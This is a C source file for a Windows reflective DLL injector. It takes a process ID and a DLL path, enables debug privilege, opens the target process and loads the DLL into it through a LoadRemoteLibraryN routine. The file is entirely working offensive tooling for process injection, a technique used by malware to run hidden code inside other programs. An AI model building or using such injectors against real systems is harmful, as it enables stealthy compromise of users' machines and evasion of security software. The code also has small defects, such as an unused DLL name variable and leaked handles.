#define WIN32_LEAN_AND_MEAN
#include <Windows.h>
#include <stdio.h>
#include <stdlib.h>
#include "LoadLibraryN.h"

BOOL Inject(DWORD dwProcessId, char* cpDllFile) {
	HANDLE hFile = NULL;
	DWORD dwLength = 0;
	LPVOID lpBuffer = NULL;
	DWORD dwBytesRead = 0;
	HANDLE hModule = NULL;
	HANDLE hProcess = NULL;
	HANDLE hToken = NULL;
	TOKEN_PRIVILEGES priv = { 0 };
	hFile = CreateFileA(cpDllFile, GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	if (hFile == INVALID_HANDLE_VALUE) {
		printf("Failed to open the dll file\n");
		return false;
	}

	dwLength = GetFileSize(hFile, NULL);
	if (dwLength == INVALID_FILE_SIZE || dwLength == 0) {
		printf("Failed to get the dll file size\n");
		return false;
	}

	lpBuffer = HeapAlloc(GetProcessHeap(), 0, dwLength);
	if (!lpBuffer) {
		printf("Failed to allocate the heap\n");
		return false;
	}

	if (ReadFile(hFile, lpBuffer, dwLength, &dwBytesRead, NULL) == FALSE) {
		printf("Failed to read file to buffer\n");
		return false;
	}

	if (OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken)) {
		priv.PrivilegeCount = 1;
		priv.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
		if (LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &priv.Privileges[0].Luid))
			AdjustTokenPrivileges(hToken, FALSE, &priv, 0, NULL, NULL);
		CloseHandle(hToken);
	}

	hProcess = OpenProcess(PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ, FALSE, dwProcessId);
	if (!hProcess) {
		printf("Failed to open the target process.\n");
		return false;
	}

	hModule = LoadRemoteLibraryN(hProcess, lpBuffer, dwLength, NULL);
	if (!hModule) {
		printf("Failed to inject the dll");
		return false;
	}

	printf("[+] Injected the %s dll into process %d", cpDllFile, dwProcessId);
	WaitForSingleObject(hModule, -1);
	return true;
}

int main(int argc, char* argv[]) {
	DWORD dwProcessId = 0;

#ifdef _WIN64
	char* cpDllFile = (char*)"ReflectiveDll64.dll";
#else
#ifdef _WIN86
	char* cpDllFile = (char*)"ReflectiveDll32.dll";
#else _WIN_ARM
	char* cpDllFile = (char*)"ReflectiveDllARM.dll";
#endif
#endif

	dwProcessId = atoi(argv[1]);
	if (Inject(dwProcessId, argv[2])) {
		printf("Done\n");
	}
	else {
		printf("Failed\n");
	}
	return 0;
}